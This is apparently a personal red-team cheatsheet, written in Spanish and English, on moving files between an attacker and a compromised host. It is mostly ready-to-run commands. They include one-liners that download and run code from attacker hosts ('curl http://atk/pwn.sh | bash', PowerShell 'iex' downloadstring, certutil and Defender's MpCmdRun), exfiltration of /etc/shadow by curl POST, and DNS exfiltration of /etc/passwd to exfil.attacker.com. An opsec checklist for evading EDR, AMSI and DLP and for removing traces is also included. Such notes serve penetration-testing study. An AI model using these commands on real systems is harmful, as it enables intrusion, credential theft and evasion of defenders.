---
aliases:
  - Transferencia de Archivos
  - File Upload
  - File Download
  - Data Exfil
tags:
  - type/technique
  - technique/command-and-control
  - technique/exfiltration
  - env/linux
  - env/windows
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Post-Explotación]]"
tertiary categories:
  - "[[Operational Tasks]]"
type: Atomic
linked:
  - "[[Reverse Shell]]"
  - "[[Linux Post-Explotación]]"
  - "[[Windows Post-Explotación]]"
  - "[[netexec]]"
---
# File Transfers

***

## Cheatsheet
^file-transfers

| Método | Uso |
| --- | --- |
| **Python HTTP server** | `python3 -m http.server 8000` |
| **Python HTTPS** | `python3 -c "import http.server, ssl; ..."` |
| **impacket-smbserver** | `impacket-smbserver share . -smb2support` |
| **updog** (Python auth HTTP) | `updog -p 8000 --password pass` |
| **wget / curl** (Linux dest) | `wget http://atk/f; curl -O http://atk/f` |
| **certutil** (Win dest) | `certutil -urlcache -split -f http://atk/f f.exe` |
| **IEX download-string** (PS) | `iex (new-object net.webclient).downloadstring('http://atk/s.ps1')` |
| **PS Invoke-WebRequest** | `iwr http://atk/f -o f.exe` |
| **SMB copy (Win)** | `copy \\atk\share\f.exe .` |
| **netcat** | `nc -lvnp 4444 > f` \| `nc atk 4444 < f` |
| **base64 paste** | `base64 f; ...paste...; base64 -d > f` |

***

## Concepto

Mover archivos entre atacante y target durante engagement — **downloaders** (target descarga de atacante), **uploaders** (target sube a atacante), **pivot** (chain a través de host intermedio).

Restricciones típicas:
- Outbound filtering (firewall sale HTTP/S ok, SMB bloqueado).
- EDR detecta `certutil` / `powershell downloadstring`.
- No tty interactivo (webshell) — requiere comandos one-shot.
- Disk write monitoreado — preferir in-memory cuando sea posible.

## 1. Atacante — servidores de distribución

### HTTP (Python)

```bash
# Python 3
python3 -m http.server 8000

# Python 3 SSL (2-liner)
python3 -c "import http.server, ssl; s = http.server.HTTPServer(('0.0.0.0', 8443), http.server.SimpleHTTPRequestHandler); s.socket = ssl.wrap_socket(s.socket, certfile='cert.pem', server_side=True); s.serve_forever()"

# PHP
php -S 0.0.0.0:8000
```

### SMB (impacket)

```bash
# Anónimo
impacket-smbserver share /tmp/loot -smb2support

# Con creds (targets modernos rechazan anon)
impacket-smbserver share /tmp/loot -smb2support -username guest -password ''
```

### FTP

```bash
# pyftpdlib (Python)
python3 -m pyftpdlib -p 21 -w   # anónimo con write

# vsftpd config rápido:
# anonymous_enable=YES
# anon_upload_enable=YES
```

### TFTP (legacy, UDP 69)

```bash
sudo atftpd --daemon --port 69 /tmp/tftp
```

### Updog (auth)

```bash
pip install updog
updog -p 8000 --password 'secret'
# Upload form + download link con password
```

## 2. Linux target — download

```bash
# wget
wget http://10.10.14.5:8000/pwn.sh -O /tmp/pwn.sh

# curl
curl -o /tmp/pwn.sh http://10.10.14.5:8000/pwn.sh
curl -O http://10.10.14.5:8000/pwn.sh   # conserva nombre

# Bash /dev/tcp (sin wget/curl)
bash -c 'cat < /dev/tcp/10.10.14.5/8000 > /tmp/pwn.sh'

# Base64 paste (sin egress)
# En atacante:
base64 -w0 pwn.sh
# Copiar output, en target:
echo 'BASE64_HERE' | base64 -d > /tmp/pwn.sh
chmod +x /tmp/pwn.sh

# nc (puerto arbitrario)
# Atacante:  nc -lvnp 4444 < pwn.sh
# Target:    nc 10.10.14.5 4444 > /tmp/pwn.sh
```

### Run-in-memory (sin disk)

```bash
# Bash
curl -s http://atk/pwn.sh | bash
wget -qO- http://atk/pwn.sh | bash

# Python in-memory download
python3 -c "import urllib.request,subprocess; subprocess.run(['bash','-c',urllib.request.urlopen('http://atk/s.sh').read().decode()])"
```

## 3. Linux target — upload

```bash
# curl POST
curl -F "file=@/etc/shadow" http://atk:8000/

# curl PUT (si server acepta)
curl -T /tmp/loot.tar http://atk:8000/loot.tar

# scp (si SSH abierto)
scp /tmp/loot.tar atk@10.10.14.5:/tmp/

# Base64 exfil via DNS (slow but stealth)
for chunk in $(base64 -w32 /etc/passwd); do
  dig $chunk.exfil.attacker.com
done
```

## 4. Windows target — download

### PowerShell

```powershell
# IEX download + run (NUNCA toca disk)
iex (new-object net.webclient).downloadstring('http://10.10.14.5:8000/pwn.ps1')

# PS 3.0+ (Invoke-WebRequest)
iwr http://10.10.14.5:8000/pwn.exe -o C:\Windows\Temp\pwn.exe

# Invoke-RestMethod
irm http://atk/pwn.ps1 | iex

# BITS (menos flagged)
Import-Module BitsTransfer
Start-BitsTransfer -Source http://atk/pwn.exe -Destination C:\temp\pwn.exe

# PS Base64 one-liner (offline, pega en shell)
$b64 = 'TVqQAAMAA...'
[IO.File]::WriteAllBytes("C:\temp\pwn.exe", [Convert]::FromBase64String($b64))
```

### LOLBins

```cmd
# certutil — classic, pero AV-flagged
certutil -urlcache -split -f http://atk/pwn.exe C:\temp\pwn.exe

# bitsadmin
bitsadmin /transfer n http://atk/pwn.exe C:\temp\pwn.exe

# curl.exe (Windows 10 1803+)
curl.exe http://atk/pwn.exe -o C:\temp\pwn.exe

# MpCmdRun.exe (Windows Defender binary)
MpCmdRun.exe -DownloadFile -url http://atk/pwn.exe -path C:\temp\pwn.exe

# wmic (deprecated pero funciona)
wmic os get /FORMAT:"http://atk/pwn.xsl"   # XSL script run

# finger (si finger.exe)
finger user@10.10.14.5 | findstr /v line > C:\temp\out
```

### SMB (Windows)

```cmd
# Copy desde share attacker
copy \\10.10.14.5\share\pwn.exe C:\temp\pwn.exe

# Net use + copy (con auth)
net use X: \\10.10.14.5\share /user:att pass
copy X:\pwn.exe C:\temp\
net use X: /delete
```

### FTP

```cmd
# FTP interactivo desde cmd
echo open 10.10.14.5 21> ftp.txt
echo USER anonymous>> ftp.txt
echo PASS >> ftp.txt
echo binary>> ftp.txt
echo GET pwn.exe>> ftp.txt
echo bye>> ftp.txt
ftp -n -s:ftp.txt
```

## 5. Windows target — upload

```powershell
# PS POST
$file = Get-Content -Path C:\temp\loot.zip -Raw -Encoding Byte
Invoke-RestMethod -Uri http://atk:8000/upload -Method Post -Body $file

# SMB copy to attacker share
copy C:\temp\loot.zip \\10.10.14.5\share\loot.zip

# Base64 -> paste back
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\temp\loot.zip"))
```

## 6. netcat bidirectional

```bash
# Atacante recibe
nc -lvnp 4444 > file_received

# Target envía
nc 10.10.14.5 4444 < file_to_send

# Con timeout (termina auto)
nc -lvnp 4444 -w 5 > file
```

Problema: nc no siempre sabe cuándo terminar; usar `-w` + tamaño esperado.

## 7. Pivot transfers (a través de host intermedio)

```bash
# Chisel SOCKS + proxychains
# Atacante
./chisel server -p 8080 --reverse

# Host intermedio (pivot)
./chisel client atk:8080 R:socks

# Attacker via proxychains → internal target
proxychains curl http://internal:80/f.txt
```

Ver [[Pivoting & Port Forwarding]].

## 8. Stealthy channels

| Canal | Velocidad | Ruido |
| --- | --- | --- |
| **HTTPS** | Rápido | Bajo (legit traffic) |
| **DNS tunneling** (dnscat2, iodine) | 1-5 KB/s | Muy bajo |
| **ICMP tunneling** (ptunnel) | 1-10 KB/s | Medio (pocos filtros ICMP) |
| **SMB** | Rápido | Alto (egress a SMB raro) |
| **Slack/Discord webhook** | Moderado | Legit vía SaaS |

## 9. Cross-platform wordlists

Archivos útiles para drop:
- `linpeas.sh`, `linenum.sh`, `pspy64`
- `winPEAS.exe`, `PowerUp.ps1`, `SharpUp.exe`
- `chisel`, `ligolo-ng`, `sshuttle`
- `Rubeus.exe`, `Mimikatz.exe`, `SharpHound.exe`
- Static builds: `socat`, `nc.static`, `curl.static`

## 10. Opsec checklist

- Preferir **run-in-memory** > write-to-disk (evita detect on write).
- HTTPS > HTTP (bypass DLP / network monitoring).
- LOLBins > custom tools (blend con baseline).
- `certutil`, `powershell downloadstring` = heavily signatured.
- Cleanup: `del C:\temp\pwn.exe`, `rm /tmp/pwn.sh`, `certutil -urlcache -split -f http://... delete`.
- AV rescan post-write: AMSI + on-access scan puede matar payload antes de run.

## Recursos

- [HackTricks - Exfiltration](https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration)
- [LOLBAS](https://lolbas-project.github.io/) — Windows LOLBins búsqueda por función.
- [GTFOBins](https://gtfobins.github.io/) — Linux equivalent.
- [PayloadsAllTheThings - File Transfers](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md)

***
